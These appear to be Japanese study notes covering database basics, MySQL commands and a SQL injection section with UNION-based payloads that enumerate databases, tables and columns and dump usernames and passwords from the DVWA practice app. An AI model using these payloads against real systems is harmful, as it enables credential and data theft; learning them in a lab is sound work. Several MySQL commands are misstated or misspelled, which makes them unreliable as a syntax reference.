    • リレーショナル：表と似ている mysql、Oracle、microsoft sql server、acess
    • 非リレーショナル：分散型で、ACID 原則の遵守を保証しない。MongoDb、Redis、HBase

    制約の種類

    1. 主キー制約（primary key）：このフィールドが非 NULL かつ一意であることを保証する。1 つの表には主キーを 1 つだけ持つことができ、主キーは表中のフィールドの一意識別子である。
    2. NOT NULL 制約（not null）：フィールドが空でないことを保証する。
    3. 一意制約（unique）：このフィールドが一意であることを保証するが、NULL になることは可能である。
    4. 外部キー制約（foreign key）：ある表に存在する別の表の主キーまたは一意キーが、この表の外部キーになる。
    5. デフォルト制約（default）：このフィールドにデフォルト値があることを保証する。

    Mysql

    データベース

    データベースへの接続

    mysql -u [database_name] -p [password]

    データベースの照会

    show database

    データベースの作成

    create [database_name]

    データベースの削除

    drop [database_name]

    データベースに入る

    use [database_name]

    テーブル table

    テーブルの照会

    show tables

    テーブル記述の表示

    desc [table_name]

    追加・削除・照会・更新

    • 追加：insert into 表名(键1,键2……) values(值1,值2……)

    複数組のフィールド insert into 表名(key1,key2……) values(value1,value2)(value3,value4)

    • 更新：update 表名 set 键名='值' where 条件(列值)
    • 削除：

    物理削除：delete from 表名 where 条件

    論理削除

    • 照会：

    select *(列名) from 表名

    select 列 from 表 where 条件

    select 列 from 表 by 某列 ASC(升序)/DESC（降序）

    select GROUP_CONTACT(列) from 表 where クエリ結果を行形式で表示

    select 列 from 表 order by 数字 表示するキーの数。既存より大きいとエラー、小さいと正常に表示

    select 列 from 表 limit 5 先頭 5 行の表示を制限

    select 列 from 表 limit 5(偏移量)，10(显示行数) 6～15 行目の表示を制限

    select 数字（其他任意内容）,数字（其他任意内容）…… 表示位置に応じて入力内容を出力する。データベースのエコーバック列数は固定であり、表示位置を満たす場合にのみエコーバックされる

    SQLインジェクション

    注入位置

    注入位置：GET、POST、HEAD ヘッダー

    文字列は単一引用符で囲まれ、数値は単一引用符で囲まれない

    単一引用符は # でコメントアウトできる

    union

    union キーワード。結合クエリで、2 つの select 文を 1 つの文に結合し、1 つの結果として表示する。

    結合クエリでは、2 つの select は同じフィールド数でなければならない（union はクエリ対象の表の列数とフィールド型が一致することを要求する）

    union all すべてのデータを直接結合する

    union 結合後のデータを重複排除する

    information_schema フィールド情報を照会する

    注入フロー

    1. データベースの種類を照会する（エラー、datebase（））
    2. データベース名を調べる
    3. テーブル名を調べる
    4. 列名を調べる
    5. 情報を取得する

    データベースの種類を調べる

    select * from 表名 where id='1' union select 1,database()

    データベースのテーブル内容を照会する

    0' union select 1,table_name from information_schema.tables where table_schema='dvwa

    列名を調べる

    0' union select 1,group_concat(column_name) from information_schema.columns where table_name='users

    情報を調べる

    0' union select user,password from users#

    すべてのデータを返す

    select * from 表明 where id=1 or 1=1
